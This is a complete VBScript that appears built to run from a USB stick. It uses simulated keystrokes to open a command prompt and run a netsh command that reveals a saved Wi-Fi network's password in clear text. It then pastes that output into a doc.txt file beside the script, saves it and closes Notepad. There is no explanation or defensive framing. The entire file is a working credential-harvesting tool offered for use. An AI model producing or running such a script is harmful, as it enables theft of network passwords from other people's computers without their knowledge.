Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")

'Define the Wi-Fi network name and Notepad file name
Dim wifiName
wifiName = ""   'Enter wifi name here'
Dim notepadFileName
notepadFileName = "doc.txt"     'create doc.txt file in usb'

'Create the object for sending keys
Set x = CreateObject("WScript.Shell")

'Send the Windows key to open the Start menu
x.SendKeys "^{ESC}"
WScript.Sleep(1000)

'Open the Command Prompt
x.SendKeys "cmd"
WScript.Sleep(1000)
x.SendKeys "{ENTER}"
WScript.Sleep(2000)

'Run the "netsh" command to show profiles and copy to clipboard
x.SendKeys "netsh wlan show profiles """ & wifiName & """ key=clear | clip"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)

'Exit the Command Prompt
x.SendKeys "exit"
WScript.Sleep(100)
x.SendKeys "{ENTER}"
WScript.Sleep(100)

'Get the script's directory
strScriptDir = objFSO.GetParentFolderName(WScript.ScriptFullName)

'Build the full path to the Notepad file
strFilePath = objFSO.BuildPath(strScriptDir, notepadFileName)

'Check if the file exists
If objFSO.FileExists(strFilePath) Then
    'Open Notepad with the specified file
    objShell.Run "notepad.exe " & strFilePath
Else
    WScript.Echo "File not found: " & strFilePath
End If

'Add a 2-second delay
WScript.Sleep(2000)

'Paste the contents into Notepad (Ctrl+V)
x.SendKeys "^v"
WScript.Sleep(100)

'Save changes in Notepad (Ctrl+S)
x.SendKeys "^s"
WScript.Sleep(100)

'Close Notepad (Alt+F4)
x.SendKeys "%{F4}"
WScript.Sleep(1000)